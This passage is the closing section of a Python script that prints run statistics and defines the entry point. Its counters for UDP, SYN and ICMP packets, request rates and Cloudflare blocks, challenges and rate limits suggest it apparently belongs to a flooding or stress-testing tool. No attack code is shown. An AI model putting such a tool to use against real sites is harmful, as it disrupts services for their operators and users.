        console.print(f"  Cloudflare Blocked: {stats.cloudflare_blocked:,} ({stats.cloudflare_rate:.1f}%)")
        console.print(f"  UDP Packets: {stats.udp_packets:,}")
        console.print(f"  SYN Packets: {stats.syn_packets:,}")
        console.print(f"  ICMP Packets: {stats.icmp_packets:,}")
        console.print(f"  RPS: {stats.rps:.2f}")
        console.print(f"  P95: {stats.get_percentile(95):.4f}s")
        
        console.print("\n[bold]📋 DETAILED REPORT:[/bold]")
        console.print(f"  ✅ Successful: {stats.successful:,}")
        console.print(f"  ❌ Failed: {stats.failed:,}")
        console.print(f"  ⏱️ Timeouts: {stats.timeouts:,}")
        console.print(f"  🧩 CF Challenges: {stats.cloudflare_challenge:,}")
        console.print(f"  🔒 CF CAPTCHA: {stats.cloudflare_captcha:,}")
        console.print(f"  🚫 CF Rate Limit: {stats.cloudflare_rate_limited:,}")
        
        if stats.cf_rays:
            unique_rays = len(set(stats.cf_rays))
            console.print(f"  📡 Unique CF Ray IDs: {unique_rays:,}")
        
    except Exception as e:
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")
        if args.verbose:
            import traceback
            traceback.print_exc()

def main() -> None:
    args = parse_args()
    
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        console = Console()
        console.print("\n\n[yellow]⚠️ Stopped by user.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[bold red]❌ Fatal Error: {e}[/bold red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()